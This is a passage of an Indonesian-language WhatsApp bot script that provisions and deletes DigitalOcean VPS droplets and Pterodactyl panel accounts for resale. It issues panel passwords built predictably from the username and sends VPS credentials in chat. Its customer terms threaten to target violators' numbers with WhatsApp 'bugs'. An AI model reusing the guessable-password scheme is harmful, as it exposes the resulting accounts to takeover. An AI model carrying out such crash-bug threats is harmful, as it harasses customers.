SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
ZakzzDev.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "sisadroplet": {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "deldroplet": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "cvps": {
if (!text) return m.reply(example("hostname"))
return ZakzzDev.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram & Cpu Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16GB || CPU 4', 
                  id: `.r16c4 ${text}`
                },
                {
                  title: 'Ram 1GB || CPU 1', 
                  id: `.r1c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 1', 
                  id: `.r2c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 2', 
                  id: `.r2c2 ${text}`
                },
                {
                  title: 'Ram 4GB || CPU 2', 
                  id: `.r4c2 ${text}`
                },      
                {
                  title: 'Ram 8GB || CPU 4', 
                  id: `.r8c4 ${text}`
                }                     
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Spesifikasi Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4" :case "r16c4": case "r16c8": case "r32c8": {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return

    await sleep(1000)

    let images
    let region = "sgp1"

    if (command == "r1c1") {
        images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
        images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
        images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
        images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
        images = "s-4vcpu-8gb"
    } else if (command == "r16c4") {
        images = "s-4vcpu-16gb-amd"
    } else if (command == "r16c8") {
        images = "s-8vcpu-16gb"
    } else if (command == "r32c8") {
        images = "s-8vcpu-32gb"
    }

    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(example("hostname"))

    try {
        let password = await generateRandomPassword()

        let dropletData = {
            name: hostname,
            region: region,
            size: images,
            image: 'ubuntu-22-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: `#cloud-config\npassword: ${password}\nchpasswd: { expire: False }`,
            private_networking: null,
            volumes: null,
            tags: ['T']
        }

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean
            },
            body: JSON.stringify(dropletData)
        })

        let responseData = await response.json()

        if (response.ok) {
            let dropletId = responseData.droplet.id

            await m.reply(`Memproses pembuatan vps...`)
            await new Promise(resolve => setTimeout(resolve, 60000))

            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            })

            let dropletInfo = await dropletResponse.json()
            let ipVPS = dropletInfo.droplet.networks.v4?.[0]?.ip_address || "Tidak ada alamat IP yang tersedia"

            let messageText = `VPS berhasil dibuat!\n\n`
            messageText += `ID: ${dropletId}\n`
            messageText += `IP VPS: ${ipVPS}\n`
            messageText += `Password: ${password}`

            await ZakzzDev.sendMessage(m.chat, { text: messageText })
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`)
        }
    } catch (err) {
        console.error(err)
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`)
    }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2":
case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2":
case "unli-v2": case "unlimited-v2": {
    if (!isCreator && !isPremium) return Reply(mess.owner);
    
    if (!text) return m.reply("Format salah!\nContoh:\n.1gb-v2 username,628XXX");

    const [rawUsername, rawNomor] = text.split(",");
    if (!rawUsername || !rawNomor) return m.reply("Format salah!\nContoh:\n.1gb-v2 username,628XXX");

    const username = rawUsername.trim().toLowerCase();
    const nomor = rawNomor.trim().replace(/\D/g, "") + "@s.whatsapp.net";

    const resources = {
        "1gb-v2": { ram: 1000, disk: 1000, cpu: 40 },
        "2gb-v2": { ram: 2000, disk: 1000, cpu: 60 },
        "3gb-v2": { ram: 3000, disk: 2000, cpu: 80 },
        "4gb-v2": { ram: 4000, disk: 2000, cpu: 100 },
        "5gb-v2": { ram: 5000, disk: 3000, cpu: 120 },
        "6gb-v2": { ram: 6000, disk: 3000, cpu: 140 },
        "7gb-v2": { ram: 7000, disk: 4000, cpu: 160 },
        "8gb-v2": { ram: 8000, disk: 4000, cpu: 180 },
        "9gb-v2": { ram: 9000, disk: 5000, cpu: 200 },
        "10gb-v2": { ram: 10000, disk: 5000, cpu: 220 },
        "unli-v2": { ram: 0, disk: 0, cpu: 0 },
        "unlimited-v2": { ram: 0, disk: 0, cpu: 0 }
    };

    const { ram, disk, cpu } = resources[command];
    const email = `${username}@Zakzz.id`;
    const password = `${username}Zakzz`;
    const fullName = `${func.capital(username)} ZakzzDev`;

    try {
        const registered = await ZakzzDev.onWhatsApp(nomor.split("@")[0]);
        if (!registered || registered.length < 1) return m.reply("❌ Nomor tidak terdaftar di WhatsApp.");

        const userRes = await fetch(`${domainV2}/api/application/users`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikeyV2}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: fullName,
                last_name: "Server",
                language: "en",
                password
            })
        });
        const userData = await userRes.json();
        const userId = userData?.attributes?.id;
        if (!userId) throw new Error("Gagal membuat user.");

        const eggRes = await fetch(`${domainV2}/api/application/nests/${nestidV2}/eggs/${eggV2}`, {
            method: "GET",
            headers: { Authorization: `Bearer ${apikeyV2}` }
        });
        const eggData = await eggRes.json();
        const startup = eggData?.attributes?.startup;

        const serverRes = await fetch(`${domainV2}/api/application/servers`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikeyV2}`
            },
            body: JSON.stringify({
                name: fullName,
                description: "© AlwaysZakzz - 2025 - 2026",
                user: userId,
                egg: parseInt(egg2),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
                startup,
                environment: {
                    INST: "npm",
                    USER_UPLOAD: "0",
                    AUTO_UPDATE: "0",
                    CMD_RUN: "npm start"
                },
                limits: { memory: ram, swap: 0, disk, io: 500, cpu },
                feature_limits: { databases: 5, backups: 5, allocations: 5 },
                deploy: {
                    locations: [parseInt(loc2)],
                    dedicated_ip: false,
                    port_range: []
                }
            })
        });
        const serverData = await serverRes.json();
        const serverId = serverData?.attributes?.id;
        if (!serverId) throw new Error("Gagal membuat server.");

        const caption = 
`
┏━━━━━━━━━━━━━━━━┓
┃ *Informasi Akun Panel*
┗━━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━┓
┃ *Spesifikasi Server*
┗━━━━━━━━━━━━━┛
RAM     : ${ram === 0 ? "Unlimited" : ram / 1000 + " GB"}
DISK    : ${disk === 0 ? "Unlimited" : disk / 1000 + " GB"}
CPU     : ${cpu === 0 ? "Unlimited" : cpu + "%"}

📌 *SYARAT & KETENTUAN*
• Berlaku selama 1 bulan
• Simpan data baik-baik
• Masa aktif: ± 30 hari (terhitung dari hari ini)
• Garansi 15 hari (1x penggantian)
• Data hanya dikirim *1x* oleh Owner
• Klaim garansi wajib menyertakan *bukti transaksi/chat*
• No Ddos panel!!
• Melanggar?? nomor anda jadi bahan bug
• Jangan lupa follow Channel: https://whatsapp.com/channel/0029VbAbqrkBvvseV1Cpk73p

╚═━━━━[ *AlwaysZakzz* ]━━━━═╝`;

        const msg = generateWAMessageFromContent(nomor, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({ text: caption }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ text: global.foot }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            ...(await prepareWAMessageMedia(
                                { image: { url: "https://files.catbox.moe/wkt68h.jpg" } },
                                { upload: ZakzzDev.waUploadToServer }
                            )),
                            title: "Pesanan Panel anda datang!!",
                            hasMediaAttachment: true
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "Salin Username", copy_code: username }) },
                                { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "Salin Password", copy_code: password }) },
                                { name: "cta_url",  buttonParamsJson: JSON.stringify({ display_text: "Login ke Panel", url: global.domain2 }) }
                            ]
                        })
                    })
                }
            }
        }, { userJid: nomor, quoted: m });

        await ZakzzDev.relayMessage(nomor, msg.message, { messageId: msg.key.id });

        m.reply(`✅ Server *@${username}* berhasil dibuat & dikirim ke *${nomor.split("@")[0]}*`, m.chat, { mentions: [nomor] });

    } catch (err) {
        console.error("Error membuat panel", err);
        m.reply("❌ Gagal membuat server:\n" + err.message);
    }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "listadmin-v2": {
  if (!isCreator && !isPremium) return Reply(mess.owner)

  let cek = await fetch(global.domainV2 + "/api/application/users?page=1", {
    method: "GET",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + global.apikeyV2
    }
  })

  let res2 = await cek.json();
  let users = res2.data;
  if (!users || users.length < 1) return m.reply("Tidak ada admin panel di server V2.")

  var teks = `
╔═━━━━[ *LIST ADMIN PANEL V2* ]━━━━═╗

┏━━━━━━━━━━━━━━━━━┓
┃ *Informasi Admin Panel*
┗━━━━━━━━━━━━━━━━━┛`;

  users.forEach((i) => {
    if (i.attributes.root_admin !== true) return;
    teks += `
👤 *ID:* ${i.attributes.id}
📛 *Nama:* ${i.attributes.first_name}
📅 *Dibuat:* ${i.attributes.created_at.split("T")[0]}
───────────────────────`;
  });

  teks += `

╚═━━━━[ *AlwaysZakzz* ]━━━═╝`;

  await ZakzzDev.sendMessage(m.chat, {
    buttons: [
      {
        buttonId: `.deladmin-v2`,
        buttonText: { displayText: 'Hapus Admin Panel V2' },
        type: 1
      }
    ],
    footer: `© 2025 ${botname}`,
    headerType: 1,
    viewOnce: true,
    text: teks,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
    },
  }, { quoted: m })
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "listpanel-v2": case "listp-v2": case "listserver-v2": {
  if (!isCreator && !isPremium) return Reply(mess.owner)

  let f = await fetch(global.domainV2 + "/api/application/servers?page=1", {
    method: "GET",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + global.apikeyV2
    }
  })

  let res = await f.json();
  let servers = res.data;
  if (!servers || servers.length < 1) return m.reply("Tidak ada server di panel V2.")

  let teks = `
╔═━━━━━━━[ *LIST SERVER PANEL V2* ]━━━━━━═╗

┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃     *Informasi Server Panel*
┗━━━━━━━━━━━━━━━━━━━━━━━┛`;

  for (let server of servers) {
    let s = server.attributes;
    let f3 = await fetch(global.domainV2 + "/api/client/servers/" + s.uuid.split("-")[0] + "/resources", {
      method: "GET",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + global.capikeyV2
      }
    })
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;

    teks += `
🆔 *ID:* ${s.id}
📛 *Nama:* ${s.name}
🖥️ *RAM:* ${s.limits.memory == 0 ? "Unlimited" : (s.limits.memory / 1000) + "GB"}
💽 *Disk:* ${s.limits.disk == 0 ? "Unlimited" : (s.limits.disk / 1000) + "GB"}
⚙️ *CPU:* ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu + "%"}
📅 *Dibuat:* ${s.created_at.split("T")[0]}
───────────────────────`;
  }

  teks += `

╚═━━━━━━━[ *AlwaysZakzz* ]━━━━━━═╝`;

  await ZakzzDev.sendMessage(m.chat, {
    buttons: [
      { buttonId: `.delpanel-v2`, buttonText: { displayText: 'Hapus Server Panel V2' }, type: 1 }
    ],
    footer: `© 2025 ${botname}`,
    headerType: 1,
    viewOnce: true,
    text: teks,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
    },
  }, { quoted: m })
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "deladmin-v2": {
  if (!isCreator) return Reply(mess.owner)

  if (!text) {
    let cek = await fetch(global.domainV2 + "/api/application/users?page=1", {
      method: "GET",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + global.apikeyV2
      }
    })

    let res2 = await cek.json();
    let users = res2.data;
    if (users.length < 1) return m.reply("Tidak ada admin panel di server V2")

    let list = []
    for (let i of users) {
      if (i.attributes.root_admin !== true) continue;
      list.push({
        title: `${i.attributes.first_name} (ID ${i.attributes.id})`,
        id: `.deladmin-v2 ${i.attributes.id}`
      })
    }

    return ZakzzDev.sendMessage(m.chat, {
      buttons: [
        {
          buttonId: 'action',
          buttonText: { displayText: 'Pilih Admin Panel V2' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
              title: 'Pilih Admin Panel V2',
              sections: [
                {
                  title: 'List Admin Panel V2',
                  rows: [...list]
                }
              ]
            })
          }
        }
      ],
      footer: `© 2025 ${botname}`,
      headerType: 1,
      viewOnce: true,
      text: "\nSilakan pilih akun admin panel V2 yang ingin dihapus\n",
      contextInfo: {
        isForwarded: true,
        mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
      },
    }, { quoted: m })
  }

  let idToDelete = args[0]
  let cek = await fetch(global.domainV2 + "/api/application/users?page=1", {
    method: "GET",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + global.apikeyV2
    }
  })

  let res2 = await cek.json();
  let users = res2.data;

  let found = null;
  for (let e of users) {
    if (e.attributes.id == idToDelete && e.attributes.root_admin === true) {
      found = e;
      break;
    }
  }

  if (!found) return m.reply("Akun admin panel V2 tidak ditemukan atau bukan root_admin!")

  let delusr = await fetch(global.domainV2 + `/api/application/users/${found.attributes.id}`, {
    method: "DELETE",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + global.apikeyV2
    }
  })

  if (delusr.ok) {
    return m.reply(`✅ Berhasil menghapus akun admin panel V2 *${found.attributes.first_name}* (ID ${found.attributes.id})`)
  } else {
    let err = await delusr.json()
    return m.reply(`Gagal menghapus admin panel V2. Error: ${JSON.stringify(err.errors || err)}`)
  }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "delpanel-v2": {
  if (!isCreator && !isPremium) return Reply(mess.owner);

  if (!text) {
    let list = [];
    let f = await fetch(global.domainV2 + "/api/application/servers?page=1", {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + global.apikeyV2
      }
    });
    let res = await f.json();
    let servers = res.data;
    if (!servers || servers.length < 1) return m.reply("Tidak Ada Server Bot di server V2");

    for (let server of servers) {
      let s = server.attributes;
      list.push({
        title: `${s.name} (ID ${s.id})`,
        description: `RAM: ${s.limits.memory == 0 ? "Unlimited" : (s.limits.memory / 1000) + "GB"} | DISK: ${s.limits.disk == 0 ? "Unlimited" : (s.limits.disk / 1000) + "GB"} | CPU: ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu + "%"}`,
        id: `.delpanel-v2 ${s.id}`
      });
    }

    return ZakzzDev.sendMessage(m.chat, {
      buttons: [
        {
          buttonId: 'action',
          buttonText: { displayText: 'Pilih Server Panel V2' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
              title: 'Hapus Server Panel V2',
              sections: [
                {
                  title: 'List Server Panel V2',
                  rows: list
                }
              ]
            })
          }
        }
      ],
      footer: `© 2025 ${botname}`,
      headerType: 1,
      viewOnce: true,
      text: "\nSilakan pilih server panel V2 yang ingin dihapus\n",
      contextInfo: {
        isForwarded: true,
        mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
      },
    }, { quoted: m });
  }

  let serverId = Number(text);
  if (!serverId) return m.reply("Masukkan ID server yang valid.");

  let result = await fetch(global.domainV2 + "/api/application/servers?page=1", {
    method: "GET",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + global.apikeyV2
    }
  });
  let json = await result.json();
  let servers = json.data;

  let foundServer = null;
  for (let srv of servers) {
    if (srv.attributes.id == serverId) {
      foundServer = srv.attributes;
      break;
    }
  }

  if (!foundServer) return m.reply("Server panel V2 tidak ditemukan!");

  // Hapus server panel
  let del = await fetch(global.domainV2 + `/api/application/servers/${foundServer.id}`, {
    method: "DELETE",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + global.apikeyV2
    }
  });

  if (!del.ok) {
    let err = await del.json();
    return m.reply("Gagal menghapus server panel V2.\n" + JSON.stringify(err.errors || err));
  }

  // Cari dan hapus user pemilik server
  let usersRes = await fetch(global.domainV2 + "/api/application/users?page=1", {
    method: "GET",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + global.apikeyV2
    }
  });
  let usersJson = await usersRes.json();
  let users = usersJson.data;

  let ownerToDelete = users.find(u => u.attributes.first_name.toLowerCase() === foundServer.name.toLowerCase());
  if (ownerToDelete) {
    await fetch(global.domainV2 + `/api/application/users/${ownerToDelete.attributes.id}`, {
      method: "DELETE",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + global.apikeyV2
      }
    });
  }

  m.reply(`✅ Berhasil menghapus server panel V2 *${capital(foundServer.name)}*`);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "deletealluserpanel-v2": {
  if (!isOwner && !isCreator) return onlyOwn();

  try {
    const headers = {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + global.apikeyV2
    };

    // Ambil semua user dari panel V2
    const userResponse = await fetch(`${global.domainV2}/api/application/users`, {
      method: "GET",
      headers
    });
    const userData = await userResponse.json();

    let deletedUsers = 0;

    for (const user of userData.data || []) {
      const u = user.attributes;
      if (!u.root_admin && u.email !== global.emailPanelV2) {
        await fetch(`${global.domainV2}/api/application/users/${u.id}`, {
          method: "DELETE",
          headers
        });
        deletedUsers++;
      }
    }

    m.reply(`✅ Berhasil menghapus *${deletedUsers} user panel V2* non-admin.`);

  } catch (err) {
    console.error(err);
    m.reply("❌ Terjadi kesalahan pada Panel V2: " + err.message);
  }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "deletealluserpanel": {
  if (!isOwner && !isCreator) return onlyOwn();

  try {
    const headers = {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    };

    // Ambil semua user
    const userResponse = await fetch(`${domain}/api/application/users`, { method: "GET", headers });
    const userData = await userResponse.json();

    let deletedUsers = 0;

    for (const user of userData.data) {
      const u = user.attributes;
      if (!u.root_admin && u.email !== global.emailPanel) {
        await fetch(`${domain}/api/application/users/${u.id}`, {
          method: "DELETE",
          headers
        });
        deletedUsers++;
      }
    }

    m.reply(`✅ Berhasil menghapus *${deletedUsers} user panel* non-admin.`);

  } catch (err) {
    console.error(err);
    m.reply("❌ Terjadi kesalahan: " + err.message);
  }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb":
case "6gb": case "7gb": case "8gb": case "9gb": case "10gb":
case "unlimited": case "unli": {
    if (!isCreator && !isPremium) return Reply(mess.owner);
    
    if (!text) return m.reply("Format salah!\nContoh:\n.1gb username,628XXX");

    const [rawUsername, rawNomor] = text.split(",");
    if (!rawUsername || !rawNomor) return m.reply("Format salah!\nContoh:\n.1gb username,628XXX");

    const username = rawUsername.trim().toLowerCase();
    const nomor = rawNomor.trim().replace(/\D/g, "") + "@s.whatsapp.net";

    const resources = {
        "1gb": { ram: 1000, disk: 1000, cpu: 40 },
        "2gb": { ram: 2000, disk: 1000, cpu: 60 },
        "3gb": { ram: 3000, disk: 2000, cpu: 80 },
        "4gb": { ram: 4000, disk: 2000, cpu: 100 },
        "5gb": { ram: 5000, disk: 3000, cpu: 120 },
        "6gb": { ram: 6000, disk: 3000, cpu: 140 },
        "7gb": { ram: 7000, disk: 4000, cpu: 160 },
        "8gb": { ram: 8000, disk: 4000, cpu: 180 },
        "9gb": { ram: 9000, disk: 5000, cpu: 200 },
        "10gb": { ram: 10000, disk: 5000, cpu: 220 },
        "unli": { ram: 0, disk: 0, cpu: 0 },
        "unlimited": { ram: 0, disk: 0, cpu: 0 }
    };

    const { ram, disk, cpu } = resources[command];
    const email = `${username}@Zakzz.id`;
    const password = `${username}Zakzz`;
    const fullName = `${func.capital(username)} ZakzzDev`;

    try {
        const registered = await ZakzzDev.onWhatsApp(nomor.split("@")[0]);
        if (!registered || registered.length < 1) return m.reply("❌ Nomor tidak terdaftar di WhatsApp.");

        const userRes = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: fullName,
                last_name: "Server",
                language: "en",
                password
            })
        });
        const userData = await userRes.json();
        const userId = userData?.attributes?.id;
        if (!userId) throw new Error("Gagal membuat user.");

        const eggRes = await fetch(`${domain}/api/application/nests/${nestid}/eggs/${egg}`, {
            method: "GET",
            headers: { Authorization: `Bearer ${apikey}` }
        });
        const eggData = await eggRes.json();
        const startup = eggData?.attributes?.startup;

        const serverRes = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            },
            body: JSON.stringify({
                name: fullName,
                description: "© AlwaysZakzz - 2025 - 2026",
                user: userId,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
                startup,
                environment: {
                    INST: "npm",
                    USER_UPLOAD: "0",
                    AUTO_UPDATE: "0",
                    CMD_RUN: "npm start"
                },
                limits: { memory: ram, swap: 0, disk, io: 500, cpu },
                feature_limits: { databases: 5, backups: 5, allocations: 5 },
                deploy: {
                    locations: [parseInt(loc)],
                    dedicated_ip: false,
                    port_range: []
                }
            })
        });
        const serverData = await serverRes.json();
        const serverId = serverData?.attributes?.id;
        if (!serverId) throw new Error("Gagal membuat server.");

        const caption = 
`

┏━━━━━━━━━━━━━━━━┓
┃ *Informasi Akun Panel*
┗━━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━┓
┃ *Spesifikasi Server*
┗━━━━━━━━━━━━━┛
RAM     : ${ram === 0 ? "Unlimited" : ram / 1000 + " GB"}
DISK    : ${disk === 0 ? "Unlimited" : disk / 1000 + " GB"}
CPU     : ${cpu === 0 ? "Unlimited" : cpu + "%"}

📌 *SYARAT & KETENTUAN*
• Berlaku selama 1 bulan
• Simpan data baik-baik
• Masa aktif: ± 30 hari (terhitung dari hari ini)
• Garansi 15 hari (1x penggantian)
• Data hanya dikirim *1x* oleh Owner
• Klaim garansi wajib menyertakan *bukti transaksi/chat*
• No Ddos panel!!
• Melanggar?? nomor anda jadi bahan bug
• Jangan lupa follow Channel: https://whatsapp.com/channel/0029VbAbqrkBvvseV1Cpk73p

╚═━━━━[ *AlwaysZakzz* ]━━━━═╝`;

        const msg = generateWAMessageFromContent(nomor, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({ text: caption }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ text: global.foot }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            ...(await prepareWAMessageMedia(
                                { image: { url: 'https://files.catbox.moe/wkt68h.jpg' } },
                                { upload: ZakzzDev.waUploadToServer }
                            )),
                            title: "Pesanan Panel anda datang!!",
                            subtitle: "Zakzz Server Access Created",
                            hasMediaAttachment: true
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                { name: 'cta_copy', buttonParamsJson: JSON.stringify({ display_text: 'Salin Username', copy_code: username }) },
                                { name: 'cta_copy', buttonParamsJson: JSON.stringify({ display_text: 'Salin Password', copy_code: password }) },
                                { name: 'cta_url',  buttonParamsJson: JSON.stringify({ display_text: 'Login ke Panel', url: global.domain }) }
                            ]
                        })
                    })
                }
            }
        }, { userJid: nomor, quoted: m });

        await ZakzzDev.relayMessage(nomor, msg.message, { messageId: msg.key.id });

        m.reply(`✅ Server *@${username}* berhasil dibuat & dikirim ke *${nomor.split("@")[0]}*`, m.chat, { mentions: [nomor] });

    } catch (err) {
        console.error("Error membuat panel", err);
        m.reply("❌ Gagal membuat server:\n" + err.message);
    }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "listadmin": {
  if (!isCreator && !isPremium) return Reply(mess.owner)

  let cek = await fetch(domain + "/api/application/users?page=1", {
    method: "GET",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  })

  let res2 = await cek.json();
  let users = res2.data;
  if (users.length < 1) return m.reply("Tidak ada admin panel")

  var teks = `
╔═━━━━━━━[ *LIST ADMIN PANEL* ]━━━━━━═╗

┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃   *Informasi Admin Panel*
┗━━━━━━━━━━━━━━━━━━━━━━━┛`;

  users.forEach((i) => {
    if (i.attributes.root_admin !== true) return;
    teks += `
👤 *ID:* ${i.attributes.id}
📛 *Nama:* ${i.attributes.first_name}
📅 *Dibuat:* ${i.attributes.created_at.split("T")[0]}
───────────────────────`;
  });

  teks += `

╚═━━━━━━━[ *AlwaysZakzz* ]━━━━━━═╝`;

  await ZakzzDev.sendMessage(m.chat, {
    buttons: [
      {
        buttonId: `.deladmin`,
        buttonText: { displayText: 'Hapus Admin Panel' },
        type: 1
      }
    ],
    footer: `© 2025 ${botname}`,
    headerType: 1,
    viewOnce: true,
    text: teks,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
    },
  }, { quoted: m })
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "listpanel": case "listp": case "listserver": {
  if (!isCreator && !isPremium) return Reply(mess.owner)

  let f = await fetch(domain + "/api/application/servers?page=1", {
    method: "GET",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  })
  let res = await f.json();
  let servers = res.data;
  if (servers.length < 1) return m.reply("Tidak Ada Server Bot")

  let teks = `
